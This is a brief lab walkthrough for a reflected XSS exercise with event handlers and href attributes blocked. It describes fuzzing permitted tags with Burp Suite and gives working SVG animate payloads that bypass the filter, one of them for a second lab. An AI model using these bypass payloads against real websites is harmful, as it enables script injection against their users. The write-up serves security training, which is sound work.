# **Reflected XSS with event handlers and `href` attributes blocked**

Task: This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:  
\<a href=""\>Click me\</a\>  
Toolkit: Burpsuite, browser

1. As we knew, WAF block all events and href. So we activate sniper attack in search term to investigate which tags are allowed

![][image1]  
so allowed tags are  
a, animate,svg,title, image

2. write down payload

\<svg\>\<a\>\<animate attributeName=href values=javascript:alert(1) /\>\<text x=20 y=20\>Click me\</text\>\</a\>\</svg\>

done   
![][image2]

in lab Reflected XSS with some SVG markup allowed svg, animateTransform, onbegin. So down below is payload  
\<svg\>\<animate onbegin="alert(1)" /\>\</svg\>
